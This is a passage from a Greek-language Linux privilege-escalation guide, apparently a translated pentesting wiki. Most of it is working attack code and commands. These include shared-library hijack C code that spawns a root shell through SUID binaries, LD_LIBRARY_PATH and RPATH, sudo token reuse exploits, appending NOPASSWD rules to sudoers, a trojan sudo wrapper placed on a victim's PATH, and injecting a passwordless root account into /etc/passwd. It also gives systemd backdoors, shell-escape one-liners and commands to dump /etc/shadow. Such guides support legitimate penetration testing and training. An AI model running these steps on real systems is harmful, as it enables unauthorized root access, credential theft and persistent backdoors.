static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – Έγχυση .so

Όταν συναντάμε ένα δυαδικό αρχείο με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να επαληθεύουμε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την παρακάτω εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η συνάντηση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (Δεν υπάρχει τέτοιο αρχείο ή κατάλογος)"_ υποδηλώνει ένα δυνητικό σημείο εκμετάλλευσης.

Για να εκμεταλλευτείτε αυτό, θα πρέπει να προχωρήσετε δημιουργώντας ένα αρχείο C, όπως _"/path/to/.config/libcalc.c"_, που περιέχει τον παρακάτω κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, αφού μεταγλωττιστεί και εκτελεστεί, στοχεύει στην αύξηση των προνομίων με την αλλαγή των δικαιωμάτων αρχείων και την εκτέλεση μιας κέλυφος με αυξημένα προνόμια.

Μεταγλωττίστε τον παραπάνω C κώδικα σε ένα αρχείο κοινόχρηστου αντικειμένου (.so) με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεασμένου SUID δυαδικού αρχείου θα πρέπει να ενεργοποιήσει την εκμετάλλευση, επιτρέποντας την πιθανή παραβίαση του συστήματος.


## Απάτη με κοινόχρηστα αντικείμενα (Shared Object Hijacking)
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που βρήκαμε ένα SUID δυαδικό αρχείο που φορτώνει μια βιβλιοθήκη από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε τη βιβλιοθήκη σε αυτόν τον φάκελο με τον απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Εάν λάβετε ένα σφάλμα όπως το εξής:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Αυτό σημαίνει ότι η βιβλιοθήκη που έχετε δημιουργήσει πρέπει να έχει μια συνάρτηση με το όνομα `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια συλλογή από Unix δυαδικά αρχεία που μπορούν να εκμεταλλευτούν από έναν επιτιθέμενο για να παρακάμψει τους τοπικούς περιορισμούς ασφαλείας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείτε **μόνο να εισαγάγετε ορίσματα** σε μια εντολή.

Το έργο συλλέγει νόμιμες λειτουργίες των Unix δυαδικών αρχείων που μπορούν να καταχραστούν για να διαφύγουν από περιορισμένα κελιά, να αναβαθμίσουν ή να διατηρήσουν αυξημένα προνόμια, να μεταφέρουν αρχεία, να δημιουργήσουν bind και αντίστροφα κελιά και να διευκολύνουν τις άλλες εργασίες μετά την εκμετάλλευση.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Εάν έχετε πρόσβαση στην εντολή `sudo -l` μπορείτε να χρησιμοποιήσετε το εργαλείο [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν βρίσκει τρόπο να εκμεταλλευτεί οποιονδήποτε κανόνα sudo.

### Επαναχρησιμοποίηση Καρτελών Sudo

Σε περιπτώσεις όπου έχετε **πρόσβαση sudo** αλλά όχι τον κωδικό πρόσβασης, μπορείτε να αναβαθμίσετε τα προνόμια περιμένοντας για την εκτέλεση μιας εντολής sudo και στη συνέχεια να καταλάβετε το καρτέλα συνεδρίας.

Απαιτήσεις για την αναβάθμιση των προνομίων:

* Έχετε ήδη ένα κέλυφος ως χρήστης "_sampleuser_"
* Ο χρήστης "_sampleuser_" έχει **χρησιμοποιήσει το `sudo`** για να εκτελέσει κάτι στα **τελευταία 15 λεπτά** (από προεπιλογή αυτή είναι η διάρκεια του καρτέλας sudo που μας επιτρέπει να χρησιμοποιήσουμε το `sudo` χωρίς να εισαγάγουμε κωδικό πρόσβασης)
* `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
* Το `gdb` είναι προσβάσιμο (μπορείτε να το ανεβάσετε)

(Μπορείτε να ενεργοποιήσετε προσωρινά το `ptrace_scope` με την εντολή `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή να τροποποιήσετε μόνιμα το αρχείο `/etc/sysctl.d/10-ptrace.conf` και να ορίσετε `kernel.yama.ptrace_scope = 0`)

Εάν πληρούνται όλες αυτές οι απαιτήσεις, **μπορείτε να αναβαθμίσετε τα προνόμια χρησιμοποιώντας:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* Η **πρώτη εκμετάλλευση** (`exploit.sh`) θα δημιουργήσει το δυαδικό αρχείο `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για να **ενεργοποιήσετε το καρτέλα sudo στη συνεδρία σας** (δεν θα λάβετε αυτόματα ένα κέλυφος ως root, κάντε `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στον φάκελο _/tmp_ **που ανήκει στον χρήστη root με setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Το **τρίτο exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα αρχείο sudoers** που καθιστά τα sudo tokens αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν το sudo.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Όνομα_Χρήστη>

Εάν έχετε **δικαιώματα εγγραφής** στον φάκελο ή σε οποιοδήποτε από τα δημιουργημένα αρχεία μέσα στον φάκελο, μπορείτε να χρησιμοποιήσετε το δυαδικό [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) για να **δημιουργήσετε ένα sudo token για έναν χρήστη και ένα PID**.\
Για παράδειγμα, εάν μπορείτε να αντικαταστήσετε το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα κέλυφος ως αυτόν τον χρήστη με PID 1234, μπορείτε να **αποκτήσετε δικαιώματα sudo** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό πρόσβασης, κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιήσει την εντολή `sudo` και πώς. Αυτά τα αρχεία **από προεπιλογή μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο, μπορείτε να **αποκτήσετε κάποιες ενδιαφέρουσες πληροφορίες**, και αν μπορείτε να **γράψετε** οποιοδήποτε αρχείο, θα μπορείτε να **αναβαθμίσετε τα δικαιώματα**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Εάν μπορείς να γράψεις, μπορείς να καταχραστείς αυτήν την άδεια.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος για να καταχραστείτε αυτές τις άδειες είναι:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν μερικές εναλλακτικές για το δυαδικό `sudo` όπως το `doas` για το OpenBSD, θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Απάτη με το Sudo

Αν γνωρίζετε ότι ένας χρήστης συνήθως συνδέεται σε έναν υπολογιστή και χρησιμοποιεί το `sudo` για να αυξήσει τα προνόμια του και έχετε ένα κέλυφος μέσα σε αυτό το πλαίσιο χρήστη, μπορείτε να **δημιουργήσετε ένα νέο εκτελέσιμο sudo** που θα εκτελεί τον κώδικά σας ως root και στη συνέχεια την εντολή του χρήστη. Στη συνέχεια, **τροποποιήστε το $PATH** του πλαισίου χρήστη (για παράδειγμα προσθέτοντας τη νέα διαδρομή στο .bash\_profile) έτσι ώστε όταν ο χρήστης εκτελεί το sudo, να εκτελείται το sudo εκτελέσιμο σας.

Σημειώστε ότι αν ο χρήστης χρησιμοποιεί ένα διαφορετικό κέλυφος (όχι το bash) θα πρέπει να τροποποιήσετε άλλα αρχεία για να προσθέσετε τη νέα διαδρομή. Για παράδειγμα, το [sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί τα `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε ένα άλλο παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Ή εκτελώντας κάτι σαν:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Κοινόχρηστη Βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα φορτωμένα αρχεία ρυθμίσεων**. Συνήθως, αυτό το αρχείο περιέχει την ακόλουθη διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι τα αρχεία ρυθμίσεων από τη διαδρομή `/etc/ld.so.conf.d/*.conf` θα διαβαστούν. Αυτά τα αρχεία ρυθμίσεων **δείχνουν σε άλλους φακέλους** όπου θα γίνει **αναζήτηση** για **βιβλιοθήκες**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

Αν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις διαδρομές που αναφέρονται: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιοδήποτε φάκελο μέσα στο αρχείο ρυθμίσεων μέσα στο `/etc/ld.so.conf.d/*.conf`, μπορεί να καταφέρει να αναβαθμίσει τα δικαιώματά του.\
Ρίξτε μια ματιά στο **πώς να εκμεταλλευτείτε αυτήν την εσφαλμένη ρύθμιση** στην ακόλουθη σελίδα:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Αντιγράφοντας τη βιβλιοθήκη στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτήν τη θέση, όπως καθορίζεται από τη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια, δημιουργήστε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με την εντολή `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Δυνατότητες

Οι δυνατότητες του Linux παρέχουν ένα **υποσύνολο των διαθέσιμων προνομίων του ριζικού χρήστη σε ένα διεργασία**. Αυτό διαιρεί αποτελεσματικά τα προνόμια του ριζικού σε μικρότερες και διακριτικές μονάδες. Κάθε μια από αυτές τις μονάδες μπορεί να χορηγηθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο, το πλήρες σύνολο των προνομίων μειώνεται, μειώνοντας τους κινδύνους εκμετάλλευσης.\
Διαβάστε την ακόλουθη σελίδα για να **μάθετε περισσότερα για τις δυνατότητες και πώς να τις καταχραστείτε**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Δικαιώματα καταλόγου

Σε έναν κατάλογο, το **bit "εκτέλεσης"** υποδηλώνει ότι ο επηρεαζόμενος χρήστης μπορεί να κάνει "**cd**" στον φάκελο.\
Το **bit "ανάγνωσης"** υποδηλώνει ότι ο χρήστης μπορεί να **καταλογογραφήσει** τα **αρχεία**, και το **bit "εγγραφής"** υποδηλώνει ότι ο χρήστης μπορεί να **διαγράψει** και **δημιουργήσει** νέα **αρχεία**.

## ACLs

Οι Λίστες Ελέγχου Πρόσβασης (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο δικαιωμάτων κατά την διάκριση, ικανά να **αντικαταστήσουν τα παραδοσιακά δικαιώματα ugo/rwx**. Αυτά τα δικαιώματα ενισχύουν τον έλεγχο της πρόσβασης σε αρχεία ή καταλόγους επιτρέποντας ή απαγορεύοντας δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι οι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομερείας εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορούν να βρεθούν [**εδώ**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** στον χρήστη "kali" δικαιώματα ανάγνωσης και εγγραφής σε ένα αρχείο:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Αποκτήστε** αρχεία με συγκεκριμένα ACL από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Ανοίξτε συνεδρίες κέλυφους

Σε **παλαιότερες εκδόσεις** μπορείτε να **καταλάβετε** μια συνεδρία κέλυφους ενός διαφορετικού χρήστη (**root**).\
Στις **νεότερες εκδόσεις** θα μπορείτε να **συνδεθείτε** μόνο σε συνεδρίες οθόνης του **ίδιου χρήστη**. Ωστόσο, μπορείτε να βρείτε **ενδιαφέρουσες πληροφορίες μέσα στη συνεδρία**.

### Κατάλογος συνεδριών οθόνης
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (130).png>)

**Συνδεθείτε σε μια συνεδρία**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Απαγωγή συνεδριών tmux

Αυτό ήταν ένα πρόβλημα με **παλιές εκδόσεις του tmux**. Δεν μπορούσα να απαγάγω μια συνεδρία tmux (v2.1) που δημιουργήθηκε από τον ριζικό χρήστη ως μη προνομιούχος χρήστης.

**Λίστα συνεδριών tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Συνδέσου σε μια συνεδρία**

Για να συνδεθείτε σε μια συνεδρία, χρησιμοποιήστε την ακόλουθη εντολή:

```bash
tmux attach-session -t <session_name>
```

Αντικαταστήστε το `<session_name>` με το όνομα της συνεδρίας που θέλετε να συνδεθείτε.
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Ελέγξτε το **Valentine box από το HTB** για ένα παράδειγμα.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα κλειδιά SSL και SSH που δημιουργήθηκαν σε συστήματα βασισμένα σε Debian (Ubuntu, Kubuntu, κλπ) ανάμεσα στον Σεπτέμβριο του 2006 και την 13η Μαΐου 2008 μπορεί να επηρεαστούν από αυτό το σφάλμα.\
Αυτό το σφάλμα προκαλείται κατά τη δημιουργία ενός νέου κλειδιού ssh σε αυτά τα λειτουργικά συστήματα, καθώς **ήταν δυνατές μόνο 32.768 παραλλαγές**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το δημόσιο κλειδί ssh μπορείτε να αναζητήσετε το αντίστοιχο ιδιωτικό κλειδί**. Μπορείτε να βρείτε τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Ενδιαφέρουσες τιμές ρυθμίσεων SSH

* **PasswordAuthentication:** Καθορίζει εάν επιτρέπεται η αυθεντικοποίηση με κωδικό πρόσβασης. Η προεπιλογή είναι `no`.
* **PubkeyAuthentication:** Καθορίζει εάν επιτρέπεται η αυθεντικοποίηση με δημόσιο κλειδί. Η προεπιλογή είναι `yes`.
* **PermitEmptyPasswords**: Όταν επιτρέπεται η αυθεντικοποίηση με κωδικό πρόσβασης, καθορίζει εάν ο διακομιστής επιτρέπει την είσοδο σε λογαριασμούς με κενούς κωδικούς πρόσβασης. Η προεπιλογή είναι `no`.

### PermitRootLogin

Καθορίζει εάν ο ριζικός χρήστης μπορεί να συνδεθεί με ssh, η προεπιλογή είναι `no`. Δυνατές τιμές:

* `yes`: Ο ριζικός χρήστης μπορεί να συνδεθεί χρησιμοποιώντας κωδικό πρόσβασης και ιδιωτικό κλειδί
* `without-password` ή `prohibit-password`: Ο ριζικός χρήστης μπορεί να συνδεθεί μόνο με ένα ιδιωτικό κλειδί
* `forced-commands-only`: Ο ριζικός χρήστης μπορεί να συνδεθεί μόνο χρησιμοποιώντας ιδιωτικό κλειδί και εάν οι επιλογές εντολών είναι καθορισμένες
* `no` : όχι

### AuthorizedKeysFile

Καθορίζει τα αρχεία που περιέχουν τα δημόσια κλειδιά που μπορούν να χρησιμοποιηθούν για την αυθεντικοποίηση του χρήστη. Μπορεί να περιέχει δείκτες όπως `%h`, που θα αντικατασταθούν από τον κατάλογο home. **Μπορείτε να υποδείξετε απόλυτα μονοπάτια** (ξεκινώντας από `/`) ή **σχετικά μονοπάτια από τον κατάλογο home του χρήστη**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Η παραμετροποίηση αυτή θα υποδείξει ότι αν προσπαθήσετε να συνδεθείτε με το **ιδιωτικό** κλειδί του χρήστη "**testusername**", το ssh θα συγκρίνει το δημόσιο κλειδί του κλειδιού σας με αυτά που βρίσκονται στις διαδρομές `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`.

### ForwardAgent/AllowAgentForwarding

Η προώθηση του SSH agent σας επιτρέπει να **χρησιμοποιείτε τα τοπικά σας κλειδιά SSH αντί να αφήνετε τα κλειδιά** (χωρίς φράσεις πρόσβασης!) να καθίζουν στον διακομιστή σας. Έτσι, θα μπορείτε να **μεταβείτε** μέσω ssh **σε έναν διακομιστή** και από εκεί να **μεταβείτε σε έναν άλλο** διακομιστή **χρησιμοποιώντας** το **κλειδί** που βρίσκεται στον **αρχικό σας διακομιστή**.

Πρέπει να ορίσετε αυτήν την επιλογή στο `$HOME/.ssh.config` όπως εξής:
```
Host example.com
ForwardAgent yes
```
Παρατηρήστε ότι εάν το `Host` είναι `*`, κάθε φορά που ο χρήστης μεταβαίνει σε ένα διαφορετικό μηχάνημα, αυτό το μηχάνημα θα μπορεί να έχει πρόσβαση στα κλειδιά (το οποίο είναι ένα θέμα ασφαλείας).

Το αρχείο `/etc/ssh_config` μπορεί να **αντικαταστήσει** αυτές τις **επιλογές** και να επιτρέψει ή να απαγορεύσει αυτήν τη διαμόρφωση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **απαγορεύσει** την προώθηση του ssh-agent με τη λέξη-κλειδί `AllowAgentForwarding` (η προεπιλογή είναι επιτρέπεται).

Εάν ανακαλύψετε ότι η προώθηση του Agent είναι διαμορφωμένη σε ένα περιβάλλον, διαβάστε την ακόλουθη σελίδα καθώς **μπορείτε να την εκμεταλλευτείτε για να αναβαθμίσετε τα δικαιώματα**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Ενδιαφέροντα Αρχεία

### Αρχεία προφίλ

Το αρχείο `/etc/profile` και τα αρχεία στο `/etc/profile.d/` είναι **σενάρια που εκτελούνται όταν ένας χρήστης εκτελεί ένα νέο κέλυφος**. Επομένως, εάν μπορείτε **να γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να αναβαθμίσετε τα δικαιώματα**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Εάν βρεθεί οποιοδήποτε περίεργο αρχείο προφίλ, θα πρέπει να το ελέγξετε για **ευαίσθητες πληροφορίες**.

### Αρχεία Passwd/Shadow

Ανάλογα με το λειτουργικό σύστημα, τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να χρησιμοποιούν διαφορετικό όνομα ή να υπάρχει αντίγραφο ασφαλείας. Επομένως, συνιστάται να **βρείτε όλα αυτά τα αρχεία** και να **ελέγξετε εάν μπορείτε να τα διαβάσετε** για να δείτε **αν υπάρχουν κατακερματισμένες τιμές** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **κατακερματισμένους κωδικούς πρόσβασης** μέσα στο αρχείο `/etc/passwd` (ή αντίστοιχο).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Πρώτα, δημιουργήστε έναν κωδικό πρόσβασης με έναν από τις παρακάτω εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Στη συνέχεια, προσθέστε τον χρήστη `hacker` και προσθέστε τον δημιουργημένο κωδικό πρόσβασης.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ .: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Μπορείτε τώρα να χρησιμοποιήσετε την εντολή `su` με τον χρήστη `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν ψεύτικο χρήστη χωρίς κωδικό πρόσβασης.\
ΠΡΟΕΙΔΟΠΟΙΗΣΗ: μπορεί να μειωθεί η τρέχουσα ασφάλεια της συσκευής.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ΣΗΜΕΙΩΣΗ: Στις πλατφόρμες BSD, το `/etc/passwd` βρίσκεται στο `/etc/pwd.db` και `/etc/master.passwd`, επίσης το `/etc/shadow` μετονομάζεται σε `/etc/spwd.db`.

Θα πρέπει να ελέγξετε αν μπορείτε **να γράψετε σε ορισμένα ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο διαμόρφωσης υπηρεσίας**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν η μηχανή εκτελεί έναν διακομιστή **tomcat** και μπορείτε να **τροποποιήσετε το αρχείο ρύθμισης υπηρεσίας Tomcat μέσα στο /etc/systemd/**, τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor σας θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει το tomcat.

### Έλεγχος Φακέλων

Οι παρακάτω φάκελοι μπορεί να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανώς δεν θα μπορέσετε να διαβάσετε τον τελευταίο, αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Παράξενη τοποθεσία/Αρχεία που ανήκουν σε άλλον χρήστη

Μια από τις τεχνικές που μπορείτε να χρησιμοποιήσετε για να αναζητήσετε πιθανές ευπάθειες προνομιακής αύξησης είναι να ελέγξετε για παράξενες τοποθεσίες ή αρχεία που ανήκουν σε άλλους χρήστες.

Αυτό μπορεί να σας δώσει μια ιδέα για πιθανές ευπάθειες που επιτρέπουν σε έναν χρήστη να αποκτήσει προνόμια που δεν του ανήκουν.

Για να ελέγξετε αυτές τις παράξενες τοποθεσίες ή αρχεία, μπορείτε να χρησιμοποιήσετε τις παρακάτω εντολές:

```bash
find / -type f -user root -perm -4000 2>/dev/null
find / -type f -user root -perm -2000 2>/dev/null
find / -type f -user root -perm -6000 2>/dev/null
find / -type f -user root -perm -7000 2>/dev/null
```

Αυτές οι εντολές θα επιστρέψουν αρχεία που ανήκουν στον χρήστη root και έχουν ορισμένα δικαιώματα που μπορεί να είναι ευπάθειες προνομιακής αύξησης.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Τροποποιημένα αρχεία τις τελευταίες λεπτές

Για να ελέγξετε τα τροποποιημένα αρχεία στις τελευταίες λεπτές, μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή:

```bash
find / -type f -mmin -1
```

Αυτή η εντολή θα επιστρέψει όλα τα αρχεία που έχουν τροποποιηθεί στις τελευταίες λεπτές. Μπορείτε να προσαρμόσετε τον αριθμό των λεπτών ανάλογα με τις ανάγκες σας.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Αρχεία βάσης δεδομένων Sqlite

Τα αρχεία βάσης δεδομένων Sqlite είναι αρχεία που χρησιμοποιούνται από το σύστημα διαχείρισης βάσεων δεδομένων Sqlite. Αυτά τα αρχεία περιέχουν δομημένες πληροφορίες και δεδομένα που αποθηκεύονται σε μια βάση δεδομένων Sqlite.

Οι βάσεις δεδομένων Sqlite είναι δημοφιλείς σε πολλές εφαρμογές και λειτουργικά συστήματα, καθώς προσφέρουν μια ελαφριά και αυτόνομη λύση για την αποθήκευση δεδομένων. Τα αρχεία βάσης δεδομένων Sqlite έχουν συνήθως την κατάληξη `.db` ή `.sqlite`.

